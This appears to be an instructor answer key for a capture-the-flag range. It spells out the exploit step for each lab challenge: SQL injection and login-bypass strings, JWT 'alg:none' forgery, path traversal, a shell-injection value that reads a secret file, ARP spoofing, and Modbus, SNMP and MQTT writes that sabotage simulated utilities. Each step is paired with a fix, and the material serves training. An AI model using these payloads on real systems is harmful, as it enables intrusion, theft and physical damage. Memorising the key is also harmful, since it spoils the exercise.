# Packet River — instructor answer key

**Tier 4 (see `docs/learning-design.md`).** This is the spoiler tier: the
step-by-step for every technique, for the person running a class or for a
player who has decided to stop working it out. It is deliberately *not* in
`scoring/flags.py`, the district docs, or anything the player's client can
pull for free — the in-game hints give direction only.

Flags are `PKTR{<technique_id>_<random hex>}` and are minted fresh on every
`scoring` start, so the values below are placeholders. Paths assume the flat
(all-weaknesses-on) build.

---

## Main Street

### `generalstore_sqli` — error-based SQLi (map: `db_dumped`)
- The move: the product search is a concatenated query with verbose errors on.
  `sqlmap -u "http://127.0.0.1:8090/generalstore/search.php?q=x" --batch --dump`,
  or by hand a 3-column UNION: `q=x%' UNION SELECT 1,note,1 FROM staff_notes-- -`
  (the flag must land in the column the page prints as the product *name*).
- The flag: a row in `generalstore.staff_notes`.
- Fix: parameterised queries; errors off in production.

### `hardware_idor` — IDOR on receipts (map: `db_dumped`)
- The move: `receipt.php?id=` has no ownership check. Receipts start at `1001`;
  walk the ids with `curl`/`ffuf`.
- The flag: the `flag_holder` row in `hardware.receipts`.
- Fix: check the record's owner against the session on every read.

### `pharmacy_authbypass` — auth bypass in the portal login (map: `db_dumped`)
- The move: the login builds its query by concatenation. Username
  `' OR role='staff' LIMIT 1 -- -`, any password.
- The flag: the audit row in `pharmacy.patient_records`.
- Fix: prepared statements; verify the password hash server-side.

### `diner_backup` — exposed DB backup (map: `db_dumped`)
- The move: `GET /diner/db_backup.sql` — a full dump left in the web root.
  `ffuf` a `.sql`/`.bak` wordlist if you don't guess it.
- The flag: an `INSERT` line in that file.
- Fix: backups never live under the docroot.

### `barber_xss` — stored XSS + review bot (map: `defaced`)
- The move: the appointment-note field is stored and rendered raw. A container
  loop plays "manager" and opens every new booking (`review.php`). Put a script
  in the note; when the bot views it, the bot writes its own flag back onto
  your booking record.
- The flag: appears in your booking after the bot fires (poll the page).
- Fix: output-encode on render; CSP; the admin view should not be a real
  browser context with secrets in scope.

### `tavern_defaultcreds` — default creds (map: `carded`)
- The move: the POS/jukebox admin ships `admin` / `admin`. `hydra` if you want
  to show the brute path.
- The flag: shown on the admin dashboard once you're in.
- Fix: force a credential change on first boot; no shared defaults.

### `drycleaner_gitleak` — exposed `.git` (map: `db_dumped`)
- The move: `http://127.0.0.1:8090/drycleaner/.git/` is browsable.
  `git-dumper http://127.0.0.1:8090/drycleaner/.git/ loot/` then
  `git -C loot log -p` — a `RECOVERY_KEY` was committed to `config.php` and
  later `sed`-removed, so it only exists in history.
- The flag: the removed line in the `config.php` diff.
- Fix: don't deploy the repo; block dotfiles at the server (the flat build's
  `dotfiles-allow.conf` is the deliberate misconfig).

### `baittackle_ssrf` — SSRF (map: `db_dumped`)
- The move: `fetch.php?url=` fetches any URL server-side. Point it at
  `http://127.0.0.1/baittackle/_internal/inv.php` (a page bound to loopback
  only) and read the response it returns to you.
- The flag: in the internal inventory page's body.
- Fix: allowlist egress hosts; block loopback / link-local / metadata IPs.

---

## Civic + payments

### `townhall_deface` — weak admin + stored XSS (map: Town Hall defaced)
- The move: `/townhall/admin.php` takes `clerk` / `clerk`. The notice is stored
  and rendered raw. Post a notice; the admin page then shows a `confirm_code`.
- The flag: that `confirm_code` (also the `announce_admin.confirm_code` row).
- Fix: real auth on the admin; output-encode the notice.

### `townhall_lfi` — traversal after a weak payroll login (map: payroll drained)
- The move: the payroll login is a concatenated `WHERE username='..' AND
  password_hash='<md5>'` — bypass it. Then `payslip.php?doc=` calls `readfile()`
  with no sanitising: `?doc=../../../../run/secret/townhall_lfi/flag.txt`.
- The flag: that file.
- Fix: canonicalise the path, confine to the payslips directory, real auth.

### `police_leak` — world-readable config (map: Police defaced)
- The move: `GET /police/dispatch/config.json` — readable, includes a
  `radio_key`.
- The flag: the `radio_key` value.
- Fix: keep operational secrets out of the docroot.

### `fire_defaultcreds` — default creds (map: Fire defaced)
- The move: the station alarm panel at `/fire/` takes `admin` / `fire`.
- The flag: shown once you're in.
- Fix: change defaults at install.

### `as400_empmast` — AS/400 payroll (map: payroll drained) — Phase 3c
- The move: TN5250 to `127.0.0.1:8992`. A blank password signs you on as any
  profile (or `QSECOFR` / `QSECOFR`). At the menu run `STRSQL`, then
  `SELECT * FROM PAYROLL.PAYKEY` — the `PAYROLL` library and `EMPMAST` file are
  `*PUBLIC *ALL`. From the player box: `as400_5250.py` does the whole path.
- The flag: the `RECONKEY` column of `PAYROLL/PAYKEY`.
- Fix: `QSECURITY` 40+, require passwords, rotate `QSECOFR`, `*PUBLIC *EXCLUDE`
  on `PAYROLL` with an authorization list.

### `paygw_receipt_idor` — receipt IDOR (map: carding spreads)
- The move: `GET http://127.0.0.1:8500/receipt/<txn_id>` — no auth, ids from
  `5001`. Walk them; one memo holds the flag.
- The flag: the memo on one receipt.
- Fix: authorise every receipt read against the caller.

---

## First Packet Bank & Trust

### `bank_jwt_none` — JWT `alg:none` (map: `bank_drain`)
- The move: the token verifier honours `{"alg":"none"}`. Forge a payload with
  `role: admin`, no signature. `GET /dashboard` (staff view) then prints the
  `FLAG_JWT` wire settlement token. `POST /api/transfer` will sweep accounts if
  you want the full drain.
- The flag: `FLAG_JWT` on the staff dashboard.
- Fix: pin the expected algorithm; reject `none`; verify the signature.

### `bank_account_idor` — account IDOR (map: `bank_leak`)
- The move: `GET /api/accounts/<id>` has no ownership check. Municipal account
  `1003`'s memo carries `FLAG_IDOR`.
- The flag: account 1003's memo.
- Fix: enforce ownership on every account read.

### `z16_racf` — RACF WARNING-mode + world-readable profile (map: `bank_drain`) — Phase 3d
- The move: TN3270 to `127.0.0.1:8991`. `IBMUSER` / `SYS1` still logs on
  (never revoked; `LISTUSER IBMUSER` shows `SPECIAL OPERATIONS AUDITOR`). At
  `READY`: `RLIST FACILITY BANK.XFER.APPROVE` — the profile is `UACC(READ)` and
  in `WARNING` mode, and the recon key sits in its `INSTALLATION DATA`.
  `SETROPTS LIST` shows `NOPROTECTALL` for context. From the player box:
  `z16_3270.py` does the whole path.
- The flag: the profile's `INSTALLATION DATA` field.
- Fix: revoke `IBMUSER` / strip `SPECIAL`+`OPERATIONS` and rotate it;
  `UACC(NONE)` + access list on `BANK.XFER.APPROVE`; out of `WARNING`;
  `SETROPTS PROTECTALL(FAILURES)`; never put secrets in `INSTALLATION DATA`.

---

## Utilities (OT)

For all three: unauthenticated, unvalidated Modbus/TCP writes on `field-plc`.
The physical damage *is* the exploit; the flag just proves you had write
access. (The plant HMI login is not needed for any of this — but if you want
in, each plant has its own operator credential, minted at boot and rotated at
Alert L2; the current set is on the unauthenticated `GET /ops/handover.txt`
"shift handover" sheet on `field-plc:8093`. `QSECOFR` / `IBMUSER` / the shop
default creds, by contrast, are deliberately static — a never-rotated default
is that lesson.) Each PLC's flag sits in input registers `100..131` and only populates
while the maintenance-mode coil (`8`) is set. `modbus_attack.py <plant> flag`
sets the coil and decodes it. Fix for all: segment OT, source-allowlist the
PLC, authenticated protocol, re-assert safe state (the hardened build's
`MODBUS_WRITE_OPEN=0` scan loop does this).

### `water_modbus_pump` — (map: houses go dry) — Phase 2
- The move: `127.0.0.1:5502` (container `:502`). Stop the high-lift pump
  (`write_coil` on the pump run coil), or push a setpoint out of range.
  `modbus_attack.py water stop-pump`.

### `power_modbus_feeder` — (map: a zone goes dark) — Phase 2
- The move: `127.0.0.1:5503` (container `:503`). Open a feeder breaker
  (`write_coil 1..4 0`) or the main incomer (`write_coil 0 0`).
  `modbus_attack.py power trip <residential|business|industrial|streetlights>`.

### `factory_modbus` — (map: line jam / unsafe run) — Phase 3b
- The move: `127.0.0.1:5504` (container `:504`). Bypass the assembly-line
  e-stop and overspeed the line, or open the hopper gate with no car in
  position. `modbus_attack.py factory estop-bypass | hopper-dump | line-stop`.

### `factory_snmp` — (map: line stops) — Phase G
- The move: `factory-snmp` udp/161 (`127.0.0.1:1161`). `snmpwalk -v2c -c public
  factory-snmp .1.3.6.1.4.1.53864.1` dumps the subtree; the flag is
  `...53864.1.3.0` (opsNote), also `snmpget -Ovq -c public ... .3.0`.
  `snmpset -v2c -c private factory-snmp .1.3.6.1.4.1.53864.1.1.0 i 0` stops the
  line (publishes `pkt/factory/cmd`). `snmp_attack.py walk|flag|stop|start`.
- Derail pile-up: time `rail_console` `set switch spur` so the hopper gate is
  open (a car loading) as the train hits the branch - throughput hard-zeros.
- Fix: SNMPv3 auth+priv, no default communities, no enterprise-side write.

### `sewage_modbus` — (map: raw effluent to the beach) — Phase 4
- The move: `127.0.0.1:5505` (container `:505`). Open the storm bypass gate
  (`BYPASS_GATE`, coil 3) and/or stop aeration (coil 0) + dosing (coil 1).
  `modbus_attack.py sewage bypass`. `effluent_path` flips to `raw` within a
  few ticks; the river plume then ramps and the swimmers sicken.

### `traffic_mqtt` — (map: signals ALL-GREEN, crashes) — Phase 4
- The move: the broker at `bus:1883` is anonymous with no ACL.
  `mosquitto_pub -h bus -t pkt/traffic/1/set -m ALL-GREEN` (or `traffic_attack.py
  all-green`) locks a crossroads. The flag: `mosquitto_pub -h bus -t
  pkt/traffic/eng -m 0000` then `mosquitto_sub -h bus -t pkt/traffic/flag -C 1`.
- Fix: broker ACLs + auth (the segmented build's `acl_file`), signed commands.

### `rail_console` — (map: train derails into the factory, fire) — Phase 4
- The move: `nc rail-plc 2323`. `login maint maint`, then `flag` for the key,
  or `set label ; cat /run/secret/rail_console/flag.txt` (the label is
  concatenated into a shell call). `set switch spur` throws the switch; time it
  so the train is near the branch (`train_pos` ~0.35-0.42) and it derails.
  `rail_attack.py flag | inject "<cmd>" | spur`.
- Fix: drop the console or gate it with auth + an allowlist; never shell out on
  operator input.

## Recon

### `dns_axfr` — open zone transfer (map: nothing; pure recon) — Phase 4.5
- The move: the `player` box's resolver is `172.31.20.253` (the `dns`
  container). The `packetriver.range` zone allows AXFR from anyone:
  `dig axfr packetriver.range @dns` or `recon.py dns`. The flag is in a
  `TXT` record for `scada-legacy-07.packetriver.range` ("maintenance token
  PKTR{...}") — only visible in the full transfer, not by guessing names.
- Everything else in the zone is a CNAME onto `packetriver-<svc>.`; follow one
  and port-scan it (`nmap firstpacketbank.packetriver.range`).
- Fix: `transfer { to <secondaries> }` only, split internal/external views,
  keep secrets out of DNS.

## Network lanes

### `diner_wifi` — cleartext off the open Wi-Fi (map: Diner carded) — Phase 5a
- The segment: `172.31.60.0/24`. `netlab` `.10` = AP (portal :80, POP3 :110),
  `netlab-patron` `.20` logs in + reads mail every ~4 s, all cleartext. The
  `player` box is on the segment.
- The move: passive sniffing sees nothing on a switch, so ARP-spoof both ways:
  `arpspoof -i <if> -t 172.31.60.20 172.31.60.10` and the reverse, with
  `net.ipv4.ip_forward=1` (compose sets it). Then `tcpdump -Ani <if> host
  172.31.60.20 and host 172.31.60.10`. `wifi_sniff.py` does all of it.
- The flag is the "reconciliation code" in the one POP3 message
  (`RETR 1` body). The portal credential `diner_guest` / `Rewards2026` is also
  on the wire but is not the flag.
- Noise: the ARP spoof flips a MAC in `netlab`'s `/proc/net/arp`; it publishes
  a `severity: loud` heat event. A sustained run crosses Alert L1.
- Fix: client isolation / WPA2-Enterprise, TLS on the portal and POP3.

### `soho_router_pcap` — SOHO router pivot to rail (map: nothing direct) — Phase 5b
- `soho-router` `172.31.61.10`, admin HTTP :80, reachable from `it-net`.
  `admin` / `admin`. `home-net` behind it has `soho-resident` `.20` POSTing
  `user=rse.kmiller&pass=Sw1tchboard!` to `/portal/rail/login` every 5 s.
- The move: log in, GET `/admin/diag/capture?format=raw`. The decoded dump
  carries the resident's `POST /portal/rail/login` with the credential and a
  response header `X-Reconcile: PKTR{...}` — that header value is the flag.
  `soho_pcap.py` scripts it.
- Chain: `rse.kmiller` / `Sw1tchboard!` is a real operator account on
  `rail-plc:2323`. `nc rail-plc 2323`, `login rse.kmiller Sw1tchboard!`,
  `flag` → the `rail_console` flag, `set switch spur` (time the train) → derail.
- Fix: no WAN-side admin, rotate the default, TLS the crew portal, never reuse
  operator creds between a portal and a console.
